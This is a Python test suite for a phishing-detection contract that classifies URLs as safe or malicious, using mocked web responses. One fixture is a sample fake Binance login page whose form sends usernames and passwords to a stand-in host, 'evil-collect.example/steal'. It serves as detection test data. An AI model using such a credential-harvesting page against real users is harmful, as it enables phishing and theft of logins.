"""Direct-mode tests: the REAL contract executed by the GenVM direct
engine (gltest), with mocked web responses.

Run from the safelink/ directory:
    .venv/bin/gltest tests-direct -q

These tests live OUTSIDE tests/ on purpose: plain `pytest` cannot run
them (they need the gltest direct fixtures), and the stub suite in
tests/ cannot run under gltest's direct plugin. See TEST_LOG.md.

Direct-mode semantics to know before reading these tests:
* ``direct_deploy(path)`` deploys the contract; the first run downloads
  the GenVM release tarball matching the contract header (~129 MB,
  cached in ~/.cache/gltest-direct).
* A contract call runs the LEADER immediately; the validator is captured
  and must be run explicitly with ``direct_vm.run_validator()``.
* ``direct_vm.mock_web(pattern, {"method": "GET", "status": 200,
  "body": "..."})`` mocks web fetches. Mocks can be swapped between the
  contract call and ``run_validator()`` to simulate the validator seeing
  different external data.
"""

from pathlib import Path

import pytest

# Pin the GenVM release explicitly: the loader's "latest" resolution
# currently points at v0.3.0-rc7, whose genvm-universal.tar.xz asset
# 404s (see TEST_LOG.md). v0.2.16 is the release GrantFlow's direct
# tests pinned in Oct 2026.
SDK_VERSION = "v0.2.16"


def _deploy(direct_deploy):
    return direct_deploy(CONTRACT, sdk_version=SDK_VERSION)

CONTRACT = str(
    Path(__file__).resolve().parent.parent / "contracts" / "safelink.py"
)

LEGIT_BODY = (
    "<html><head><title>Example</title></head>"
    "<body><h1>Hello</h1><p>Welcome to our site.</p></body></html>"
)
PHISH_BODY = (
    '<html><body><h1>Binance Login</h1>'
    '<form action="https://evil-collect.example/steal">'
    '<input type="text" name="u">'
    '<input type="password" name="p">'
    "<button>Login</button></form></body></html>"
)
LOGIN_BODY = (
    "<html><body><form>"
    '<input type="text" name="u"><input type="password" name="p">'
    "</form></body></html>"
)


def _mock(direct_vm, pattern, body, status=200):
    direct_vm.mock_web(
        pattern, {"method": "GET", "status": status, "body": body}
    )


def test_deploy_defaults(direct_deploy, direct_owner):
    reg = _deploy(direct_deploy)
    stats = reg.get_stats()
    assert stats["total_entries"] == 0
    assert stats["check_count"] == 0
    assert stats["ttl_checks"] == 1000
    assert "binance.com" in stats["brands"]
    assert "genlayer.com" in stats["brands"]
    # stats["admin"] is the checksummed hex address; direct_owner is raw
    # bytes, so compare via hex, not str().
    assert stats["admin"].lower() == "0x" + direct_owner.hex()


def test_check_legit_url_safe_and_validator_agrees(
    direct_deploy, direct_vm
):
    reg = _deploy(direct_deploy)
    _mock(direct_vm, r"example\.com", LEGIT_BODY)
    result = reg.check_url("https://example.com/")
    assert result["verdict"] == "safe"
    assert result["fresh"] is True
    assert direct_vm.run_validator() is True
    assert reg.get_stats()["safe"] == 1


def test_check_phishing_url_malicious_and_validator_agrees(
    direct_deploy, direct_vm
):
    reg = _deploy(direct_deploy)
    _mock(direct_vm, r"binance-secure-login\.com", PHISH_BODY)
    result = reg.check_url("https://binance-secure-login.com/login")
    assert result["verdict"] == "malicious"
    assert result["impersonates_brand"] == "binance.com"
    assert direct_vm.run_validator() is True


def test_validator_disagrees_when_page_changes(
    direct_deploy, direct_vm
):
    reg = _deploy(direct_deploy)
    _mock(direct_vm, r"example\.com", PHISH_BODY)
    result = reg.check_url("https://example.com/login")
    assert result["verdict"] == "malicious"
    # The validator re-fetches and now sees a clean page.
    direct_vm.clear_mocks()
    _mock(direct_vm, r"example\.com", LEGIT_BODY)
    assert direct_vm.run_validator() is False


def test_validator_rejects_tampered_leader_result(
    direct_deploy, direct_vm
):
    reg = _deploy(direct_deploy)
    _mock(direct_vm, r"example\.com", LEGIT_BODY)
    reg.check_url("https://example.com/")
    tampered = {
        "url": "https://example.com",
        "host": "example.com",
        "status_code": 200,
        "is_https": True,
        "is_ip_literal": False,
        "is_punycode": False,
        "impersonates_brand": "binance.com",
        "has_password_field": True,
        "off_host_form": True,
        "blocklisted": True,
        "content_len": 10,
        "body_sample": "x",
    }
    assert direct_vm.run_validator(leader_result=tampered) is False


def test_dispute_then_recheck(direct_deploy, direct_vm):
    reg = _deploy(direct_deploy)
    _mock(direct_vm, r"binance-secure-login\.com", PHISH_BODY)
    reg.check_url("https://binance-secure-login.com/login")
    disputed = reg.dispute_url(
        "https://binance-secure-login.com/login", "looks wrong"
    )
    assert disputed["verdict"] == "disputed"
    assert disputed["disputes"] == 1
    rechecked = reg.check_url("https://binance-secure-login.com/login")
    assert rechecked["verdict"] == "malicious"
    assert rechecked["disputes"] == 1


def test_non_admin_cannot_manage(direct_deploy, direct_vm, direct_bob):
    reg = _deploy(direct_deploy)
    direct_vm.sender = direct_bob
    with pytest.raises(Exception):
        reg.add_brand("evil.example")
    with pytest.raises(Exception):
        reg.block_host("evil.example")


def test_block_host_makes_url_malicious(direct_deploy, direct_vm):
    reg = _deploy(direct_deploy)
    reg.block_host("evil.example")
    assert reg.is_blocked("evil.example") is True
    _mock(direct_vm, r"evil\.example", LEGIT_BODY)
    assert reg.check_url("https://evil.example/")["verdict"] == "malicious"


def test_list_entries_newest_first(direct_deploy, direct_vm):
    reg = _deploy(direct_deploy)
    for host in ("a.example", "b.example", "c.example"):
        _mock(direct_vm, host.replace(".", r"\."), LEGIT_BODY)
        reg.check_url("https://" + host + "/")
    page = reg.list_entries(0, 2)
    assert page["total"] == 3
    assert [e["url"] for e in page["entries"]] == [
        "https://c.example",
        "https://b.example",
    ]


def test_fetch_failure_writes_nothing(direct_deploy, direct_vm):
    reg = _deploy(direct_deploy)
    _mock(direct_vm, r"example\.com", "not found", status=404)
    with pytest.raises(Exception):
        reg.check_url("https://example.com/missing")
    assert reg.get_stats()["total_entries"] == 0
    assert reg.get_stats()["check_count"] == 0


def test_second_check_served_from_cache_without_fetch(
    direct_deploy, direct_vm
):
    reg = _deploy(direct_deploy)
    _mock(direct_vm, r"example\.com", LEGIT_BODY)
    first = reg.check_url("https://example.com/")
    assert first["cached"] is False
    # Remove all mocks: a cache hit must not fetch anything.
    direct_vm.clear_mocks()
    second = reg.check_url("https://example.com/")
    assert second["verdict"] == "safe"
    assert second["cached"] is True
    assert reg.get_stats()["check_count"] == 1


def test_invalid_url_rejected(direct_deploy, direct_vm):
    reg = _deploy(direct_deploy)
    with pytest.raises(Exception):
        reg.check_url("ftp://example.com/x")
